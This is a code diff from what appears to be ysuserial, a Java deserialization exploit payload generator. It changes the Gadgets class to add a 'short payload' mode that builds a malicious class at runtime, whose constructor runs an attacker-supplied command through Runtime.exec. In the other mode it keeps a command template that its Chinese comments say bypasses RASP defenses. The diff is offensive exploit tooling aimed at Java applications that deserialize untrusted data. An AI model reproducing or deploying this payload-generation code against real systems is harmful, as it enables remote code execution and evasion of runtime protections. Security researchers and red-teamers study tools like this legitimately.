@@ -2,9 +2,8 @@ package org.su18.ysuserial.payloads.util;
 
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
+import static org.su18.ysuserial.GeneratePayload.IS_SHORT;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
-import static org.su18.ysuserial.payloads.util.Utils.loadClassTest;
-import static org.su18.ysuserial.payloads.util.Utils.writeClassToFile;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -177,19 +176,31 @@ public class Gadgets {
 
 		CtClass ctClass = null;
 
-		// 如果 Command 不为空，则是普通的命令执行，使用 CommandTemplate 进行执行
+		// 如果 Command 不为空，则是普通的命令执行
 		if (command != null) {
-			// 修改类名
 			String time = String.valueOf(System.nanoTime());
-			ctClass = pool.get("org.su18.ysuserial.payloads.templates.CommandTemplate");
 
-			// 由于使用了 Thread 修改内部类
-			String className = ctClass.getName();
-			ctClass.setName(className + time);
-			// 修改字段
-			String cmd = "cmd = \"" + command + "\";";
-			ctClass.makeClassInitializer().insertBefore(cmd);
+			// 如果指定短 payload，则动态创建一个超级短的恶意类
+			if (IS_SHORT) {
+				ctClass = pool.makeClass("A" + time);
+				// 创建无参构造方法
+				CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+				ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
+				ctClass.addConstructor(ctConstructor);
 
+				// 如果没有指定，则默认使用带有绕过 RASP 功能的 CommandTemplate 进行执行
+			} else {
+				// 修改类名
+				ctClass = pool.get("org.su18.ysuserial.payloads.templates.CommandTemplate");
+
+				// 由于使用了 Thread 修改内部类
+				String className = ctClass.getName();
+				ctClass.setName(className + time);
+				// 修改字段
+				String cmd = "cmd = \"" + command + "\";";
+				ctClass.makeClassInitializer().insertBefore(cmd);
+
+			}
 			ctClass.setSuperclass(superClass);
 			classBytes = ctClass.toBytecode();
 		}
